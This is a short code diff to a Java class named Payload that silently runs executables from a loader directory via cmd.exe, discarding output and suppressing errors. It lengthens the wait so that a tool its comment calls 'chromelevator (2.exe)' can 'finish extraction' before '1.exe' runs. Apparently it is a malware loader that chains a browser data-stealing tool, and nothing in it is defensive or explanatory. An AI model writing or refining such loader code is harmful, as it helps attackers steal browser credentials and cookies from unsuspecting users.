@@ -193,14 +193,16 @@ public class Payload {
                 File exeFile = new File(loaderDir, exe);
                 if (exeFile.exists() && exeFile.length() > 1024) {
                     try {
-                        // Using cmd.exe /c makes Windows parse the .\ exactly as requested
-                        ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", ".\\" + exe, "all");
+                        // cmd.exe /c with working directory set to loaderDir runs it exactly like .\2.exe all
+                        String cmd = exe + " all";
+                        ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", cmd);
                         pb.directory(loaderDir);
                         pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
                         pb.redirectError(ProcessBuilder.Redirect.DISCARD);
                         pb.start();
                     } catch (Exception e) {}
-                    Thread.sleep(1000);
+                    // 5 seconds gives chromelevator (2.exe) enough time to finish extraction before 1.exe runs
+                    Thread.sleep(5000);
                 }
             }
 
